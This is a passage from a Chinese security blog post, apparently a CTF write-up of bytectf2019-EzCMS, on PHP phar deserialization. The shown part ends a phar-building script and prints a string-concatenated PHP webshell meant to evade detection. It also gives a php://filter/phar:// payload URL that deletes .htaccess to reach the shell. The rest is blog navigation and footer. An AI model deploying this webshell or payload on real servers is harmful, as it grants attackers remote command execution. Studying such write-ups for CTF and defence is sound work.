//将自定义的meta-data存入manifest</span><br><span class="line">$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件</span><br><span class="line">//签名自动计算</span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>接下来再通过拼接生成的一句话木马来绕过检测</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a=&quot;sys&quot;;</span><br><span class="line">$b=&quot;tem&quot;;</span><br><span class="line">$c=$a.$b;</span><br><span class="line">$d=$c($_REQUEST[&apos;a&apos;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>将phar文件上传后,用前面说的<code>php://filter/resource=phar://</code>去触发反序列化,然后就把<code>.htaccess</code>干掉了,再访问我们上传的马就可以拿到shell<br><code>payload:view.php?filename=8650b7902e96771b2267398829fc5234.phar&amp;filepath=php://filter/resource=phar://sandbox/bad194011f5ad0cf609c77ad222e50d6/8650b7902e96771b2267398829fc5234.phar</code></p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://paper.seebug.org/680/#0x01" target="_blank" rel="noopener">https://paper.seebug.org/680/#0x01</a></p>
+<p><a href="https://blog.zsxsoft.com/post/38" target="_blank" rel="noopener">https://blog.zsxsoft.com/post/38</a></p>
+<p><a href="https://xz.aliyun.com/t/6057#toc-0" target="_blank" rel="noopener">https://xz.aliyun.com/t/6057#toc-0</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/09/14/bytectf-无参RCE/" rel="next" title="无参函数RCE-bytectf2019-boring_code">
+                <i class="fa fa-chevron-left"></i> 无参函数RCE-bytectf2019-boring_code
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/09/26/XXE漏洞小结/" rel="prev" title="XXE漏洞小结">
+                XXE漏洞小结 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/touxiang.png" alt="R1dd1er">
+            
+              <p class="site-author-name" itemprop="name">R1dd1er</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">10</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#phar简介"><span class="nav-number">2.</span> <span class="nav-text">phar简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#phar反序列化"><span class="nav-number">3.</span> <span class="nav-text">phar反序列化</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#phar文件格式伪造及上传绕过"><span class="nav-number">4.</span> <span class="nav-text">phar文件格式伪造及上传绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#phar其他利用"><span class="nav-number">5.</span> <span class="nav-text">phar其他利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#bytectf2019-EzCMS"><span class="nav-number">6.</span> <span class="nav-text">bytectf2019-EzCMS</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考链接"><span class="nav-number">7.</span> <span class="nav-text">参考链接</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">R1dd1er</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
